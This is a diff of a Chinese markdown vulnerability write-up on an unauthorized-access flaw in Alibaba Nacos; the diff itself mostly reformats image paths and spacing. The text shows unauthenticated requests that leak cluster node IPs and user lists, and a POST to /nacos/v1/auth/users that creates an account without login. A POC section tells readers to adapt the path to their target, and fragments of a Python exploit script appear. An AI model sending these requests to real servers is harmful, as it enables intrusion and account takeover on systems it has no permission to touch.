@@ -26,124 +26,74 @@ tar -zxvf nacos-server-2.0.0-ALPHA.1.tar.gz
 ./startup.sh -m standalone
 ```
 
-
-
 然后访问 http://xxx.xxx.xxx.xxx:8848/nacos 即可，默认账号密码 **nacos/nacos**
 
-![](images/202202102003931.png)
-
-
+![](../.gitbook/assets/202202102003931.png)
 
 ## 漏洞复现
 
 可以再项目的 issues 中看到大量的关于越权的安全问题的讨论
 
-
-
 https://github.com/alibaba/nacos/issues/1105
 
+![](../.gitbook/assets/202202102003894.png)
 
-
-![](images/202202102003894.png)
-
-![](images/202202102003898.png)
-
-
+![](../.gitbook/assets/202202102003898.png)
 
 这里我们在登录后任意一个位置看一下请求，并在未授权的情况下看是否可以访问
 
-
-
-![](images/202202102004781.png)
-
-
+![](../.gitbook/assets/202202102004781.png)
 
 这里的请求url简化为
 
-
-
-http://xxx.xxx.xxx.xxx:8848/nacos/v1/core/cluster/nodes?withInstances=false&pageNo=1&pageSize=10&keyword=
-
-
+http://xxx.xxx.xxx.xxx:8848/nacos/v1/core/cluster/nodes?withInstances=false\&pageNo=1\&pageSize=10\&keyword=
 
 退出用户后在前台访问这个 url
 
-
-
-![](images/202202102004013.png)
-
-
+![](../.gitbook/assets/202202102004013.png)
 
 可以发现以及泄露了 **ip节点** 等数据
 
-
-
 同样我们查看用户列表的请求并在前台访问
 
+http://xxx.xxx.xxx.xxx:8848/nacos/v1/auth/users?pageNo=1\&pageSize=9
 
+![](../.gitbook/assets/202202102004595.png)
 
-http://xxx.xxx.xxx.xxx:8848/nacos/v1/auth/users?pageNo=1&pageSize=9
-
-
-
-![](images/202202102004595.png)
-
-![](images/202202102004600.png)
-
-
+![](../.gitbook/assets/202202102004600.png)
 
 这里可以发现对用户的请求是完全没有过滤的，可以通过未授权的情况获取用户的敏感信息
 
-
-
 我们尝试创建用户并抓包
 
-
-
-![](images/202202102004325.png)
-
-
+![](../.gitbook/assets/202202102004325.png)
 
 返回下列创建成功
 
-
-
-```plain
+```
 {"code":200,"message":"create user ok!","data":null}
 ```
 
-
-
 同样的我们简化请求
 
-
-
-```plain
+```
 POST /nacos/v1/auth/users?
 username=peiqi&password=peiqi
 ```
 
+![](../.gitbook/assets/202202102004662.png)
 
-
-![](images/202202102004662.png)
-
-![](images/202202102004665.png)
-
-
+![](../.gitbook/assets/202202102004665.png)
 
 看到有文章说要加上**User-Agent请求头**
 
-
-
-```plain
+```
 User-Agent: Nacos-Server
 ```
 
-
-
 但是大量测试之后发现好像是无关紧要的，没有请求头同样可以创建用户
 
-- 同样的原理也可以用于修改密码添加配置等
+* 同样的原理也可以用于修改密码添加配置等
 
 ## 漏洞POC
 
@@ -177,8 +127,8 @@ DNT: 1
 Connection: close
 ```
 
-- 注意下大部分企业的 nacos的url为 /v1/auth/users ，而不是  /nacos/v1/auth/users
-- 可以按目标情况自行修改
+* 注意下大部分企业的 nacos的url为 /v1/auth/users ，而不是 /nacos/v1/auth/users
+* 可以按目标情况自行修改
 
 ```python
 import requests
@@ -224,5 +174,4 @@ if __name__ == '__main__':
     POC_1(target_url)
 ```
 
-![](images/202202102004659.png)
-
+![](../.gitbook/assets/202202102004659.png)
